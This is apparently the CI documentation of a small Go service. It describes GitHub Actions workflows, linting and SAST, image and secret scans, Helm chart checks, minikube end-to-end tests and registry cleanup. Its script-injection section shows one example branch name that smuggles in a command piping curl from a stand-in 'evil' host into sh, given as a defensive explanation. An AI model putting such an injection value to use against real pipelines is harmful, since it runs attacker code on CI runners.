# CI

## Contents

- [Workflow split](#workflow-split)
- [Gather metadata](#gather-metadata)
  - [Script injection](#script-injection)
  - [PR head commit](#pr-head-commit)
  - [Commit message](#commit-message)
- [Go lint](#go-lint)
- [SAST and SCA](#sast-and-sca)
  - [Gosec exceptions](#gosec-exceptions)
- [Tool pins](#tool-pins)
  - [Tool cache](#tool-cache)
- [Build](#build)
  - [Image tags](#image-tags)
  - [Build cache](#build-cache)
- [E2E tests](#e2e-tests)
- [Chart lint](#chart-lint)
  - [Kubeconform](#kubeconform)
  - [Kube-linter policy](#kube-linter-policy)
- [Gating](#gating)
- [Minikube e2e](#minikube-e2e)
- [Static binary](#static-binary)
- [Reusable scans](#reusable-scans)
- [Repo scan](#repo-scan)
- [Image scan](#image-scan)
- [Build summary](#build-summary)
- [Common CI](#common-ci)
  - [Doc links](#doc-links)
- [Rollout verification](#rollout-verification)
- [Image cleanup](#image-cleanup)

## Workflow split

CI is split by what changed:

| Workflow | Runs on changes to | Jobs |
|---|---|---|
| [`app-ci.yml`](../.github/workflows/app-ci.yml) | `src/**`, `helm/**`, `scripts/**`, `.github/scripts/**` | [Go lint + SAST](#go-lint), [image scan](#image-scan) via [reusable scans](#reusable-scans), [multi-arch build](#build) (GHCR push, [cache](#build-cache)), [e2e](#e2e-tests) (incl. [minikube](#minikube-e2e)), [summary](#build-summary) |
| [`helm-ci.yml`](../.github/workflows/helm-ci.yml) | `helm/**` | [Chart lint](#chart-lint), [summary](#build-summary) |
| [`common-ci.yml`](../.github/workflows/common-ci.yml) | every change (no path filter) | [actionlint, ruff, pytest at 100% coverage, doc links](#common-ci), [repo secret scan](#repo-scan), [summary](#build-summary) |

Both also run when their own workflow file or `.github/actions/**` changes, so a CI edit tests itself. App CI also runs on chart changes, because the minikube e2e deploys the in-repo chart. An app-only PR doesn't lint the chart.

Gotcha: a path-filtered workflow that doesn't run leaves its checks pending. If either workflow becomes a required status check, add an always-running gate job, or the filtered PRs can never merge.

## Gather metadata

Every workflow starts with a `metadata` job that checks out the repo and runs [`.github/actions/gather-metadata`](../.github/actions/gather-metadata/action.yml). Downstream jobs read branch, SHA, commit message and trigger reason from its outputs instead of re-deriving them.

| Output | Value |
|---|---|
| `branch` | PR head branch on `pull_request`, branch name on branch pushes, empty on tag pushes |
| `sha` / `short-sha` | Commit being built (see [PR head commit](#pr-head-commit)) |
| `commit-message` | Subject line of that commit (see [Commit message](#commit-message)) |
| `reason` | `github.event_name` |

### Script injection

Values controlled by whoever opens a PR or pushes (`head_ref`, commit messages) are passed to `run:` through `env:` and read as `"$VAR"`. They are never put inline as `${{ ... }}`.

With inline `${{ }}`, Actions substitutes the text into the script before bash runs, so a branch named `` a`curl evil|sh` `` would execute. An environment variable is only data to bash. See GitHub's [security hardening guide](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections).

### PR head commit

On `pull_request`, `github.sha` is a temporary merge commit (PR merged into base) that GitHub creates for the run. Nobody pushed it, it isn't on any branch, and a short SHA built from it matches nothing in the PR. The action reports `github.event.pull_request.head.sha` instead, which is the commit the author pushed.

### Commit message

The commit subject comes from `git log` in the checked-out repo, not from the GitHub API. This needs no token or network, and it works under [act](LOCAL-TESTING.md#ci), whose runner image has no `gh` CLI.

On `pull_request`, `actions/checkout` fetches only the merge commit (`fetch-depth: 1`), so the PR head commit is not present locally. In that case the action fetches that one commit (`git fetch --depth=1 origin <sha>`) and then reads it.

## Go lint

The `lint` job runs two steps on `src/`, both with the `e2e` build tag so the e2e tests are covered too:

| Step | Kind | Catches |
|---|---|---|
| `golangci-lint (lint + SAST)` | security | `govet`, `staticcheck`, `gosec` (SAST), `errcheck`, `errorlint`, `ineffassign`, `unused`, `bodyclose`, `misspell`, `gofmt`, configured in [`src/.golangci.yml`](../src/.golangci.yml) |
| `go vet` | tests | The toolchain's own vet |

`go vet` also runs standalone because golangci-lint's `govet` doesn't report everything plain `go vet` does. For example, it misses `fmt.Println arg list ends with redundant newline`, which `go vet` found in the original `main.go`. It costs nothing extra: it ships with Go. Versions are pinned (see [Tool pins](#tool-pins)). To run locally, see [LOCAL-TESTING.md#ci](LOCAL-TESTING.md#ci).

## SAST and SCA

- **SAST:** gosec, inside golangci-lint. The standalone gosec v2.29.0 (latest as of 2026-10-21) can't load go1.27 packages. golangci-lint's bundled gosec can, honors `#nosec`, and on the original `main.go` reported G104, G114, G304 and G706.
- **SCA:** trivy on the built image ([Image scan](#image-scan)). It reads the Go binary's embedded build info, so it covers the stdlib and any Go modules as well as the OS packages. There's no separate source-level govulncheck. The cost is no reachability filtering: trivy can flag a stdlib CVE the app never calls. If that blocks a release, add a `.trivyignore` entry with the reason and an expiry rather than adding another scanner.

### Gosec exceptions

Two gosec findings in `main.go` are deliberate, and are marked `#nosec <rule> -- <reason>` at the line:

- **G304/G703 (file inclusion / path traversal)** on `os.Open(secretPath)`: the path comes from `SECRET_FILE_PATH`, which the operator sets. It's never request input, and reading it is the app's purpose.
- **G706 (log injection)** on log lines with `r.RemoteAddr`, the secret path or `PORT`: `RemoteAddr` is the TCP peer `ip:port` set by `net/http`, so a client can't put text in it, and the other two are operator config. Quoting them instead would change the log format.

Every other finding was fixed. G114 (no server timeouts) now runs an `http.Server` with read-header, read, write and idle timeouts. G104/errcheck: encode and write errors are handled and logged.

## Tool pins

Every CI tool version lives in one block in [`.github/actions/install-ci-tools`](../.github/actions/install-ci-tools/action.yml):

| Suite | Installs |
|---|---|
| `app` | Go, golangci-lint |
| `helm` | helm, kubeconform, kube-linter |
| `minikube` | Go, helm, minikube, kubectl |
| `scan` | trivy |
| `repo` | gitleaks |
| `release` | Go |
| `github` | uv (then `uv sync --locked` in `.github/`), actionlint |

An unknown suite fails fast. Binaries, including golangci-lint and helm, are fetched from upstream releases and checked against the published SHA-256 checksums, rather than through their setup actions, so they can be [cached](#tool-cache). One `k8s-version` pin (1.37.0, the newest that kubeconform schemas, minikube v1.39.0 and kubectl all support) drives kubeconform's schemas, the minikube cluster and kubectl. To bump a tool, change one line there.

Exceptions: Go comes from `src/go.mod`, everywhere: setup-go in CI, and the Dockerfile builder ([CONTAINER.md#go-toolchain](CONTAINER.md#go-toolchain)). Python and its dev tools come from `.github/.python-version`, `pyproject.toml` and `uv.lock` (see [Common CI](#common-ci)). Actions are pinned by major tag where they're used (`astral-sh/setup-uv` by exact tag, since it publishes no major tags).

Every pin carries a `# latest: <release page> (checked YYYY-MM-DD)` comment, recording when it was last compared to upstream. The pins block strips these comments before writing `$GITHUB_OUTPUT`.

### Tool cache

`install-ci-tools` uses `actions/cache` (v6) wherever a download repeats across runs:

| Cache | Path | Key | Saves |
|---|---|---|---|
| Tools | `~/.cache/ci-tools/<suite>` | suite, OS, arch, hash of `install-ci-tools/action.yml` | Every downloaded binary; on a hit, the download steps are skipped. Changing a pin or the install logic changes the key |
| Go | setup-go's module + build cache | Go version + `src/go.mod` | Compiled packages for `go test` and vet |
| minikube | `~/.minikube/cache` | arch, minikube version, `k8s-version` | Preload tarball + kicbase image (~1 GB) that `minikube start` would download |
| trivy | `~/.cache/trivy` | OS + UTC date (restore from any older day) | Vulnerability DB. Trivy still refreshes it when stale |
| kubeconform | `~/.cache/kubeconform` | `k8s-version` + hash of `helm/**` | Core and CRD-catalog JSON schemas (`-cache` flag) |
| uv | setup-uv's cache | `.github/uv.lock` | Python wheels and the interpreter |

Each cache is saved only when its key missed. Cache scope follows GitHub's rules: a PR branch can read caches from `main`, but not from other branches.

## Build

`build` is a single job: one `docker buildx build --platform linux/amd64,linux/arm64` of [`src/Dockerfile`](../src/Dockerfile), pushed to GHCR as the multi-arch `<image>:<sha>` (see [Image tags](#image-tags)), using the [registry cache](#build-cache). The Dockerfile cross-compiles Go on the build platform, and its busybox stage also runs on the build platform (see [CONTAINER.md#cross-compile](CONTAINER.md#cross-compile)). So no build step executes target-arch code, and one amd64 runner builds both arches without QEMU.

After the push, the same job:

- Copies each arch's binary out of the pushed index with [`extract-binary.sh`](../.github/scripts/extract-binary.sh), and fails unless it's static. See [Static binary](#static-binary).

Target-arch execution (e2e, minikube) happens later, in `e2e-tests` on native runners per arch.

### Image tags

Every CI run pushes to `ghcr.io/<owner>/<repo>` (lowercased by [`gather-metadata`](../.github/actions/gather-metadata/action.yml), here `ghcr.io/yoyobesser/echo-pong`):

| Tag | What |
|---|---|
| `<sha>` | OCI index (amd64 + arm64) for the full commit SHA, which is the PR head commit on PRs (see [PR head commit](#pr-head-commit)) |
| `<branch-slug>-cache` | [Build cache](#build-cache) |

`branch-slug` is the branch lowercased, with runs of characters outside `[a-z0-9._-]` replaced by `-`, so `feat/yonatan.besser/home-assignment-init` becomes `feat-yonatan.besser-home-assignment-init`. Provenance attestations are off for CI images (`provenance: false`).

Pushing needs `packages: write`, granted only to `build`. `e2e-tests` gets `packages: read`. PRs from forks get a read-only `GITHUB_TOKEN`, so they can't push. This repo's PRs come from branches in the same repo. Per-commit tags pile up. The [cleanup workflow](#image-cleanup) prunes them.

The registry is overridable: workflows pass `vars.CI_IMAGE` to `gather-metadata`, which outputs `image` and its `registry` host for `docker/login-action`. It's unset on GitHub. Locally, [act.sh](LOCAL-TESTING.md#act-wrapper) points it at a local registry.

### Build cache

The build reads and writes a BuildKit registry cache in GHCR. Because both platforms come from one build, one cache ref holds both:

- `cache-to`: `<branch-slug>-cache`, with `mode=max` (cache every stage, including the Go build stage), `image-manifest=true,oci-mediatypes=true` (the cache stored as a regular OCI image, which GHCR accepts) and `ignore-error=true` (a cache export failure never fails the build).
- `cache-from`: the branch's own cache first, then `main-cache`, so a new branch's first build starts warm from main. A missing ref is only a warning.

## E2E tests

[`src/test/e2e`](../src/test/e2e) black-box tests the image. It never imports app code. It only runs the container via the docker CLI and checks exit codes, output and HTTP responses. The `e2e` build tag keeps it out of plain `go test ./...`.

The target is set by env. `E2E_IMAGE` makes the tests start containers themselves. `E2E_BASE_URL` (plus `E2E_SECRET`) points `TestAPI` at an already-running server, and `TestCLI` skips. The same API cases therefore run against a bare container and a [live deploy](#minikube-e2e).

| Suite | Test | Covers |
|---|---|---|
| CLI | `TestCLI` | `--help`, ping/pong, wrong/missing password, missing/unknown command, missing `SECRET_FILE_PATH` |
| API | `TestAPI` | `/health`, `/`, `/ping` and `/pong` with no, wrong, raw and `Bearer` tokens |

The `e2e-tests` job runs once per arch on a native runner (`fail-fast: false`). It pulls the multi-arch `<image>:<sha>` from GHCR and fails unless the runner resolved its own arch, which also checks the index. It then runs the suites in sequence, fastest first:

- `CLI e2e`: `go test -run '^TestCLI$'` against containers.
- `API e2e`: `go test -run '^TestAPI$'` against a container.
- `minikube e2e`: `TestAPI` through the Gateway of a live deploy (see [Minikube e2e](#minikube-e2e)).

The first failing suite fails the job, and later suites are skipped.

The suites are deliberately not [`parallel:`](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobsjob_idstepsparallel) steps. actionlint 1.7.12 (latest as of 2026-10) and act 0.2.89 don't support the keyword, so parallel steps couldn't be linted or run locally. Revisit when both support it.

The secret file goes in with `docker create` + `docker cp`, not a bind mount (see [LOCAL-TESTING.md#e2e](LOCAL-TESTING.md#e2e)). The API suite waits up to 45s for `/health`, because the server sleeps 10s before listening.

## Chart lint

`helm-ci.yml` checks [`helm/echo-pong`](../helm/echo-pong), once for the base values and once with `values-local.yaml` ([HELM.md#local-values](HELM.md#local-values)), in three layers:

0. `helm dependency build` fetches the [Envoy Gateway subchart](HELM.md#envoy-gateway) pinned in `Chart.lock`. `helm/*/charts/` is gitignored.
1. `helm lint --strict`: chart structure and templates. Warnings fail too.
2. `helm template --skip-tests` renders the manifests. Test hooks are skipped because they are throwaway pods, not deployed workload, and would otherwise trip the policy below.
3. The rendered output goes through [kubeconform](#kubeconform) (schema) and [kube-linter](#kube-linter-policy) (policy).

### Kubeconform

`kubeconform -strict` validates every rendered object against the Kubernetes OpenAPI schema for the pinned `k8s-version` (see [Tool pins](#tool-pins)). `-strict` rejects unknown fields, so a typo like `readinesProbe` fails instead of being silently dropped. Bump `k8s-version` to match the target cluster's minor version.

CRDs (Gateway API `Gateway`/`HTTPRoute`/`GatewayClass`, Envoy `EnvoyProxy`) aren't in the core schema. A second `-schema-location` points at the [Datree CRDs catalog](https://github.com/datreeio/CRDs-catalog), so they're validated instead of erroring with "could not find schema".

### Kube-linter policy

[`helm/.kube-linter.yaml`](../helm/.kube-linter.yaml) sets `doNotAutoAddDefaults: true` and lists every check explicitly. Each line carries a comment naming the README requirement it enforces, so the policy is the README's requirements made executable, and nothing more.

kube-linter runs on the chart rendered **without** the Envoy Gateway subchart (`--set envoy-gateway.enabled=false`). The policy covers what this repo writes. The subchart's templates are third-party and can't satisfy every check (e.g. probes on its certgen Job). kubeconform still validates the full render.

kube-linter only flags securityContext fields that are present and wrong, with two exceptions: `run-as-non-root` and `no-read-only-root-fs` also fire when the field is unset. An unset `allowPrivilegeEscalation`, missing drop-`ALL` or missing seccomp profile is caught at deploy time instead: the minikube e2e namespace enforces [Pod Security Admission `restricted`](HELM.md#pod-security-admission), so such pods are rejected and the e2e fails.

Two custom checks set the replica floor to 2 (`minimum-two-replicas`, `hpa-minimum-two-replicas`) instead of the built-in 3. Two replicas plus a PDB keep a pod serving through a rolling update or a single node drain. README L59 (registry pull) has no static check. It's covered by deploying, not linting.

## Gating

Every check gates the run. Nothing uses `continue-on-error` except the act-only artifact steps and the summary plumbing itself.

**Fail fast** for lint, unit tests, scans and chart checks. Steps run in sequence, and the first failure stops its job. Downstream jobs that `need:` it don't start, so a lint error doesn't spend runner time on builds and e2e. The skipped checks show as `⏭️` in the [summary](#build-summary).

| Workflow | Fail-fast jobs |
|---|---|
| `app-ci.yml` | `lint` (golangci-lint, `go vet`), `test` (`go test -race -vet=off ./...`, unit tests only; vet runs in `lint`), `scan-image` |
| `helm-ci.yml` | `lint` (dependency build, helm lint, template, kubeconform, kube-linter) |
| `common-ci.yml` | `lint`, `test`, `doc-links`, `scan-repo` |

**Run everything, then fail** for e2e. In each arch's `e2e-tests` job, every suite after the first has `if: ${{ !cancelled() }}`. A failing suite doesn't stop the rest: CLI, API and minikube all run. The job still fails if any of them failed, and the summary shows which ones.

Everything passes since the original findings were fixed: `main.go` lint, vet and gosec ([Gosec exceptions](#gosec-exceptions)), the Go stdlib CVEs ([CONTAINER.md#go-toolchain](CONTAINER.md#go-toolchain)), and the chart ([HELM.md](HELM.md)). The original e2e suites weren't changed.

## Minikube e2e

The `minikube e2e` step runs last in each arch's [`e2e-tests` job](#e2e-tests), after the container and binary suites pass. It runs `TestAPI` against a live Kubernetes deploy, with traffic entering through the [Gateway](HELM.md#envoy-gateway) the way it would in production.

[`src/test/e2e/minikube-e2e.sh`](../src/test/e2e/minikube-e2e.sh) does the whole flow, locally and in CI:

1. `minikube start` (docker driver, `k8s-version` from [Tool pins](#tool-pins)), then `minikube image load` the CI image.
2. `helm dependency build` the in-repo chart (`CHART_REF` overrides the path).
3. Create the namespace with [Pod Security Admission](HELM.md#pod-security-admission) `restricted` enforced, and the [auth Secret](HELM.md#auth-secret) holding a random token. On a kept cluster, the existing token is reused, because the app reads its secret only at startup.
4. `helm upgrade --install --wait` with the CI image and `image.pullPolicy=Never`.
5. Wait for the Gateway to be `Programmed` and the Envoy proxy pods to be ready. The controller creates them after install, so `helm --wait` doesn't cover them.
6. `kubectl port-forward` the Envoy proxy Service, then run `TestAPI` with `E2E_BASE_URL` and `E2E_SECRET`.
7. Delete the cluster on exit (unless `KEEP_CLUSTER=1`).

## Static binary

The release binary is the one inside the image, not a separate build. For each arch, `build` runs [`extract-binary.sh`](../.github/scripts/extract-binary.sh): `docker create --platform linux/<arch>` on the pushed index, then `docker cp` of `/usr/local/bin/ping-pong-app`. It fails unless `file` reports `statically linked`. The container and the binary release can't drift: they are the same bytes.

For a registry index, the script first resolves the arch's own manifest digest (`docker buildx imagetools inspect --raw`) and pulls `image@<that digest>`. Pulling one index ref for two platforms in a row can fail on the runner's Docker engine with `cannot overwrite digest`. That broke the `v0.1.0` release's binaries job, after the image was already tagged.

The binary is static because the Dockerfile builds with `CGO_ENABLED=0` (see [CONTAINER.md#cross-compile](CONTAINER.md#cross-compile)). With no libc dependency, it runs on any Linux distribution of its arch.

An earlier version also ran the e2e suites against the binary on stock `ubuntu` and `alpine` images. It was dropped for CI time: the static check plus the container suites cover the same binary. darwin binaries can't come from a Linux image. They'll be cross-compiled in the release workflow.

## Reusable scans

The release-relevant scans are reusable workflows (`on: workflow_call`), called by both CI and release:

| Workflow | Jobs | Checks |
|---|---|---|
| [`scan-image.yml`](../.github/workflows/scan-image.yml) | `scan-image (amd64)`, `scan-image (arm64)` | trivy: OS packages, Go binary, image config. See [Image scan](#image-scan) |
| [`scan-repo.yml`](../.github/workflows/scan-repo.yml) | `scan-repo` | gitleaks over the full git history. See [Repo scan](#repo-scan) |

A finding fails the job; see [Gating](#gating).

- `app-ci.yml` calls `scan-image`, and `common-ci.yml` calls `scan-repo`, on every run.
- `release.yml` calls both as the release gate (README L51, L87). `publish`, the only job that tags `vX.Y.Z`, `needs:` both, so a finding means no version tag. `scan-image` scans the digest that `publish` then tags.
- SAST (gosec) isn't repeated in release. It gates every PR in `app-ci.yml`'s `lint` job, and releases are cut from `main`.

Results recorded inside a called workflow land in the caller's run, so the caller's `summary` job picks them up like any other job.

## Repo scan

README L52 ("No secrets in codebase") is checked by the reusable [`scan-repo.yml`](../.github/workflows/scan-repo.yml), called from [Common CI](#common-ci) on every commit and from release, blocking. It runs `gitleaks git` over the full git history (`fetch-depth: 0`), so a secret that was committed and later deleted still fails. Findings are `--redact`ed in the log.

It was clean on the repo when added, and a planted fake key in a throwaway clone failed it. To allow a known false positive, add a `.gitleaksignore` fingerprint with a comment saying why.

## Image scan

The reusable [`scan-image`](#reusable-scans) workflow scans each arch of the pushed index, one matrix leg per arch, with [`trivy-image.sh`](../.github/scripts/trivy-image.sh) (`trivy image --platform linux/<arch> --severity CRITICAL,HIGH --exit-code 1`). It covers OS packages, the Go binary (stdlib and modules, from its build info) and the image config (`--image-config-scanners misconfig`, e.g. running as root). It fails on any CRITICAL/HIGH finding, fixed upstream or not, because README L51 forbids shipping them. It scans the pushed image in GHCR, using the credentials `docker/login-action` wrote.

trivy is installed from its checksum-verified release tarball rather than `aquasecurity/trivy-action`, so no third-party action code runs in the job.

Blind spot: busybox is copied in as a bare binary, with no package metadata, so trivy doesn't match vulnerabilities against it. The release SBOM does list it (`busybox 1.38.0`, see [RELEASE.md#attestations](RELEASE.md#attestations)). See [CONTAINER.md#busybox](CONTAINER.md#busybox).

## Build summary

Every workflow's run summary ends with a **Tests** table and a **Security** table. Rows are checks, columns are scopes (`all`, `amd64`, `arm64`). Together they show every test and security tool's result for the run in one place.

- Each job records its check outcomes with [`record-results`](../.github/actions/record-results/action.yml) (`if: always()`, one `kind|check|outcome|conclusion` row per check), uploaded as a `ci-results-<job>-<scope>` artifact.
- A final `summary` job (`needs:` all jobs, `if: always()`) downloads them and renders the tables with [`summarize-results`](../.github/actions/summarize-results/action.yml).

Outcomes come from `steps.<id>.outcome` and `.conclusion` inside the job. The GitHub API can't be used instead: it reports a failed `continue-on-error` step as `success`, so it couldn't tell a soft failure from a pass. Naming and kind rules live in [.github/workflows/AGENTS.md](../.github/workflows/AGENTS.md).

## Common CI

`common-ci.yml` holds the repo-wide checks. It has no path filter, so it runs on every PR commit and every push to main:

- `lint` job: `actionlint (workflows)` (actionlint also runs shellcheck on `run:` blocks), `ruff check (lint)` and `ruff format (style)`.
- `test` job: `pytest (100% coverage)`.
- `doc-links` job: [doc links](#doc-links).
- `scan-repo` job: [repo-wide secret scan](#repo-scan), blocking.

The Python checks would only need `.github/**`. They run on every commit anyway, because they take about a minute and one unfiltered workflow is simpler than per-job path filters.

The Python under `.github/` ([`summarize-results/render.py`](../.github/actions/summarize-results/render.py), [`scripts/check_doc_links.py`](../.github/scripts/check_doc_links.py)) is a uv project in [`.github/pyproject.toml`](../.github/pyproject.toml):

- Python version: [`.github/.python-version`](../.github/.python-version) (`3.14`), the newest Python cached on the `ubuntu-24.04` runner image (3.14.8). uv reads it and selects (or fetches) a matching interpreter, so no `setup-python` is needed.
- Dev tools: ruff, pytest and pytest-cov, pinned in the `dev` dependency group and locked in [`.github/uv.lock`](../.github/uv.lock). CI runs `uv sync --locked`, so a stale lock fails instead of resolving silently.
- Coverage: `--cov-branch --cov-fail-under=100` in `pyproject.toml`. Line and branch coverage both have to reach 100%. Only the `if __name__ == "__main__"` guard is excluded.

To run locally, see [LOCAL-TESTING.md#common-ci](LOCAL-TESTING.md#common-ci).

### Doc links

[`check_doc_links.py`](../.github/scripts/check_doc_links.py) enforces the [AGENTS.md](../AGENTS.md) comment rule on every tracked file (`git ls-files`). It runs in [Common CI](#common-ci) on every commit, with no path filter, because doc links live in workflows, Dockerfiles, Go, shell and Helm files alike:

- **Code and config** (anything not `.md`): every `<path>.md#<anchor>` must be relative to the repo root (`docs/CI.md#gating`, never `../docs/...` or `./...`), the file must exist, and the anchor must match a heading in it.
- **Markdown**: every `[text](path#anchor)` link is resolved relative to the linking file, the way GitHub renders it, and the anchor must match a heading. `README.md?plain=1#L49` line links must point at a line that exists. External URLs are skipped.

Links inside `inline code` are text, not links, so they're skipped. So are `test_*.py` files, which hold deliberately broken links as fixtures. Anchors are computed like GitHub's: lowercase, punctuation other than `-`/`_` dropped, spaces become `-`, `-1`, `-2`, ... for duplicate headings, and headings inside fenced code are ignored. Renaming a heading without updating its links fails CI. Run it locally with `uv run --project .github python .github/scripts/check_doc_links.py`.

## Rollout verification

README L56. The `zero-downtime rollout` step in each arch's `e2e-tests` job runs [`rollout-check.sh`](../src/test/e2e/rollout-check.sh) on the cluster the minikube e2e left running (`KEEP_CLUSTER=1`). It's also a `scripts/minikube-up.sh --test` suite.

It port-forwards the Envoy proxy Service, then polls `/ping` (with the token) every 100 ms through the Gateway. Meanwhile it runs `kubectl rollout restart` and waits for the rollout to finish, so every app pod is replaced. It fails if any response isn't `200`, and logs the request count and status breakdown.

With the chart defaults ([HELM.md#zero-downtime](HELM.md#zero-downtime)) it passes with 0 failures. In a deliberately weakened config (`maxUnavailable: 1`, no `preStop` sleep), the same check failed with `211 requests, 1 not 200 (… 1 503)`, so it can detect dropped requests.

Scope: a rolling restart on a single-node minikube, through one port-forwarded Envoy pod. It doesn't cover node drains, multi-node scheduling, or Envoy's own rollouts.

## Image cleanup

README L94 ("Maintaining image versions and tags and removing old ones") and L116 ("manage older and stale versions"). [`cleanup.yml`](../.github/workflows/cleanup.yml) applies the retention policy to `ghcr.io/<owner>/<repo>`, using [`ghcr_cleanup.py`](../.github/scripts/ghcr_cleanup.py):

| Version | Kept when | Deleted when |
|---|---|---|
| `vX.Y.Z` release tag | always | never |
| `<sha>` commit image | younger than `max-age-days` (14) | older |
| `<branch-slug>-cache` | the branch still exists (`main-cache` always does) | the branch is gone |
| untagged | it's a platform manifest of a kept index | otherwise |
| any other tag | always (unknown, so kept to be safe) | never |

GHCR lists each per-arch manifest of a multi-arch index as its own untagged version. So deleting "all untagged" would break every kept multi-arch image. The script reads each kept index (`docker buildx imagetools inspect --raw`) and protects its children. Children of a deleted index become unprotected and go in the same run.

Branch slugs are computed with the same rule as `gather-metadata`'s `branch-slug`, and tests pin the two together.

Triggers:

- **Weekly** (Mondays 03:17 UTC): live. It hasn't run yet, so no live or dry run has been checked against GHCR. The policy is covered only by unit tests.
- **Manual** (`workflow_dispatch`): `dry-run` (default `true`) only lists what would be deleted. `max-age-days` overrides the 14-day window.

Every run writes a keep/delete table, with the reason for each version, to the run summary. Only the `cleanup` job gets `packages: write`. Scheduled and manual runs only start once the workflow is on `main`. Do a manual dry run before the first scheduled one. The script needs `gh` and the GitHub Packages API, so it doesn't run under act. Locally, it needs a token with `read:packages` (`gh auth refresh -s read:packages,delete:packages`).
